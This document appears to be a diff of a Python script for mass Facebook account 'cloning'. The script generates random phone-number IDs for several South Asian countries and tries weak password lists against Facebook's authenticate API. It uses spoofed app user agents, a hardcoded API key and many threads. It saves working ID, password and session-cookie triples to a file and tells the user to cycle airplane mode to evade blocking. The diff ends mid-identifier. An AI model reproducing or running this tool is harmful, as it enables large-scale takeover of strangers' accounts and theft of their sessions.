+   "Dalvik/2.1.0 (Linux; U; Android 9; LM-X120 Build/PKQ1.180904.001) [FBAN/Orca-Android;FBAV/293.0.0.14.232;FBPN/com.facebook.orca;FBLC/en_CA;FBBV/261339538;FBCR/Lucky;FBMF/LGE;FBBD/lge;FBDV/LM-X120;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; YAL-L21 Build/ HUAWEIYAL-L61) [FBAN/Orca- Android;FBAV/301.0.0.12.112;F BPN/com.facebook.orca;FBLC/ en_GB;FBBV/274784541;FBCR/ TM;FBMF/HUAWEI;FBBD/ HUAWEI;FBDV/YAL-L21;FBSV/ 10;FBCA/arm64-v8a:null;FBDM/ {density=2.55,width=1080,height =2110};FB_FW/1;]", 
+   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo A6020a46;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/Yoigo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]",
+   "Dalvik/2.1.0 (Linux; U; Android 11; SM-G973F Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build/NRD90M) Source/1 [FBAN/EMA;UNITY_PACKAGE/749;FBBV/154200404;FBAV/146.0.0.9.102;FBDV/SM-G955F;FBLC/vi_VN;FBOP/20]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/310.0.0.50.118;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/278533704;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;FBRV/0;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/EMA;UNITY_PACKAGE/2014;FBBV/282877419;FBAV/245.0.0.9.119;FBDV/HUAWEI LUA-L21;FBLC/cs_CZ;FBOP/20;FBNG/WIFI;FBMNT/NOT_METERED]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]", 
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]", 
+   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
+   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
+   "Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
+   "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]",
+   " Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]"]
+
 # Print all predefined user agents
 for agent in predefined_user_agents:
     print(agent)
 # Add the generated random user agent to the predefined list
-all_user_agents = [generate_random_user_agent()] + predefined_user_agents
+all_user_agents = [generate_random_user2_agent()] + predefined_user_agents
 
 # Randomly select a user agent
 selected_user_agent = random.choice(all_user_agents)
@@ -312,7 +231,7 @@ logo=(f"""
    {Y} ██████  ██      ███████ ██      █████   
    {Y} ██   ██ ██      ██   ██ ██      ██  ██  
    {Y} ██████  ███████ ██   ██  ██████ ██   ██  
-  {P} version •••••••••••••••••••••••••     0.3 V                                     
+  {P} version •••••••••••••••••••••••••     0.2 V                                     
 {W}──────────────────────────────────────────────────
     {Y}, .  .  ,  ,-.  .   ,   ,-.  ,-.   ,-.  
     {Y}| |\ |  | /   \  \ /    |  ) |  ) /   \ 
@@ -336,16 +255,6 @@ def ___SHUVO___():
         if option in ['1','A']:___file___()
         elif option in ['2','B']:___random___()
         else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
-#-----------------------❲ FILE ❳-----------------------#
-def ___file___():
-    global methods
-    clear()
-    print(f'{xd1} METHOD {B}❲{G}M1{B}❳{W} {B}❲{G}GRAPH{B}❳{W}');print(f'{xd2} METHOD {B}❲{G}M2{B}❳{W} {B}❲{G}API{B}❳{W}');print(f'{xd3} METHOD {B}❲{G}M3{B}❳{W} {B}❲{G}HOST{B}❳{W}');linex()
-    option = input(f'{xxdx} SELECT {xdxx} ')
-    if option =='1':methods.append('methodA');main_crack().crack(id)
-    elif option =='2':methods.append('methodB');main_crack().crack(id)
-    elif option =='3':methods.append('methodC');main_crack().crack(id)
-    else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___file___()
 #-----------------------❲ FILE INPUT ❳-----------------------#
 class main_crack():
     def __init__(self):
@@ -393,7 +302,7 @@ class main_crack():
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': generate_random_user0_agent(),
+                headers = {'User-Agent': ___swag___(),
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'graph.facebook.com',
                 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -544,31 +453,31 @@ class main_crack():
                            pwx =  pw
                        else:
                             pwx =  pw
-                            if   '{G}''methodA' in methods:SHUVOworld.submit(self.methodA, uid, name, pwx)
-                            elif'{G}''methodB' in methods:SHUVOworld.submit(self.methodB, uid, name, pwx)
-                            elif'{G}''methodC' in methods:SHUVOworld.submit(self.methodC, uid, name, pwx)
+                            if 'methodA' in methods:SHUVOworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:SHUVOworld.submit(self.methodB, uid, name, pwx)
+                            elif 'methodC' in methods:SHUVOworld.submit(self.methodC, uid, name, pwx)
                    except:pass
             result(oks,cps)   
 #-----------------------❲ RANDOM ❳-----------------------#
 def ___random___():
         clear()
-        print(f'{xd1} {G}BANGLADESH CLONING {B}❲{G}HOST METHOD{B}❳{W} ');print(f'{xd2} {G}BANGLADESH CLONING{B} ❲{G}API METHOD{B}❳{W}');print(f'{xd3} {G}INDIA CLONING ');print(f'{xd4} {G}NEPAL CLONING ');print(f'{xd5} {G}PAKISTAN CLONING ');print(f'{xd6} {G}AFGHANISTAN CLONING ');linex()
-        option = input(f'{xdxx} SELECT {xdxx} ')
+        print(f'{xd1} BANGLADESH CLONING {B}❲{G}HOST METHOD{B}❳{W} ');print(f'{xd2} BANGLADESH CLONING {B}❲{G}API METHOD{B}❳{W}');print(f'{xd3} INDIA CLONING ');print(f'{xd4} NEPAL CLONING ');print(f'{xd5} PAKISTAN CLONING ');print(f'{xd6} AFGHANISTAN CLONING ');linex()
+        option = input(f'{xdx} SELECT {xdxx} ')
         if option in ['1','A']:___bd1___()
         elif option in ['2','B']:___bd2___()
         elif option in ['3','C']:___India___()
         elif option in ['4','D']:___Nepal___()
         elif option in ['5','E']:___Pakistan___()
         elif option in ['6','F']:___Afghanistan___()
-        else:print(f"{xd} {P}OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
+        else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
 #-----------------------❲ RANDOM BD HOST ❳-----------------------#
 def ___bd1___():
     user=[]
     ck=[]
-    clear();print(f"{xdxx} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
-    clear();print(f"{xdxx} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
-    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xdxx2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdxx} SELECT  {xdxx} ')
-    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xxdx} SELECT {xxdx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
+    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
     for _ in range(limit):
         user.append("".join(random.choices(string.digits, k=8)))
     if xmk == "Y" or xmk == "y":
@@ -579,40 +488,40 @@ def ___bd1___():
         ck.append('N')
     with SHUVOxd(max_workers=35) as ___x___:
         clear();tl = str(len(user))
-        print(f'{xdxx} TOTAL UID {xdxx}{G} '+tl);print(f'{xdxx} SIM CODE  {xdxx}{G} '+code);print(f'{xxdx} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
+        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
             if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
             elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
             ___x___.submit(___HOST___,ids,passlist,tl,ck)
-    print('');linex();print(f'{xdxx} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xxdx} TOTAL CP {xxdx}{G} {str(len(cps))}');linex();exit()
+    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM BD API ❳-----------------------#
 def ___bd2___():
     os.getuid
     os.geteuid
-    clear();print(f"{xdxx}   EXAMPLE {xd} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xxdx} SELECT  {xdxx} ')
-    clear();print(f"{xdxx}   EXAMPLE {xd} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xxdx} SELECT  {xdxx} '))
-    clear();print(f"{xd1}{G}CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2}{G}CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xxdx} SELECT  {xdxx} ')
-    clear();print(f"{xd} {G}COOKIES SHOW Y{G}|{P}N");linex();xmk = input(f'{xdx}{R}SELECT {xdxx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
+    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     with SHUVOxd(max_workers=30) as __bal__:
         clear();tl = str(len(user))
-        print(f'{xdxx} TOTAL UID {xdxx}{G} '+tl);print(f'{xdxx} SIM CODE  {xdxx}{G} '+code);print(f'{xxdx} FIRST ON{W}/{R}OFF AIRPLANE MODE');linex()
+        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'113355','008866','12345@','@@@###','123456@#','rasel123','i love you','708090','203040','506070','bangladesh','jannat','018895','105144','708090','506070','121234','first8','last8','first11','jannat','@#৳%&*','sadiya']
-            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'113355','008866','12345@','@@@###','123456@#','rasel123','i love you','708090','203040','506070','bangladesh','jannat','018895','105144','708090','506070','121234','first8','first last','last8','first11','jannat','@#৳%&*','sadiya']
+            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
+            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
             __bal__.submit(___API___,ids,pwx,tl)
-    print('');linex();print(f'{xdxx} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xxdx} TOTAL CP {xxdx}{G} {str(len(cps))}');linex();exit()
+    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM INDIA ❳-----------------------#
 def ___India___():
     os.getuid
     os.geteuid
     clear();print(f"{xd} EXAMPLE {xdxx} +91639 {G}•{W} +92728 {G}•{W} +91737 {G}•{W} +94737");linex();code = input(f'{xdx} SELECT  {xdxx} ')
     clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
-    clear();print(f"{xd1}CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -648,9 +557,9 @@ def ___Nepal___():
 def ___Pakistan___():
     os.getuid
     os.geteuid
-    clear();print(f"{xd} EXAMPLE {xdxx} 0306 {G}•{W} 0335 {G}•{W} 0315 {G}•{W} 0345");linex();code = input(f'{xxdx} SELECT  {xdxx} ')
-    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xxdx} SELECT  {xdxx} '))
-    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xxdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx} 0306 {G}•{W} 0335 {G}•{W} 0315 {G}•{W} 0345");linex();code = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
+    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -731,7 +640,7 @@ def ___HOST___(ids,passlist,tl,ck):
 #-----------------------❲ RANDOM METHOD API ❳-----------------------#
 def ___API___(ids,pwv,tl):
     global loop,oks,cps
-    sys.stdout.write(f"\r{xd}{W}SHUVO-XD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush()  
+    sys.stdout.write(f"\r{xd} SHUVO-XD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush()
     try:
         for pas in pwv:
             adid = str(uuid.uuid4())
@@ -755,7 +664,7 @@ def ___API___(ids,pwv,tl):
                     'locale': 'en_GB',
                     'client_country_code': 'GB',
                     'fb_api_req_friendly_name': 'authenticate'}
-            head={'User-Agent': generate_random_user_agent(),
+            head={'User-Agent': generate_random_user2_agent(),
                     'Accept-Encoding':  'gzip, deflate',
                     'Accept': '*/*',
                     'Connection': 'keep-alive',
@@ -779,11 +688,10 @@ def ___API___(ids,pwv,tl):
                 print(f'\r{xd} COOKIES '+kuki+'\x1b[38;5;223m');linex()
                 oks.append(ids)
                 open('/sdcard/SHUVO-RANDOM-OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
-                
                 break
             else:continue
         loop+=1
     except Exception as e:
         pass
 #-----------------------❲ END ❳-----------------------#
-___SHUVO___()
+___SHUVO_user
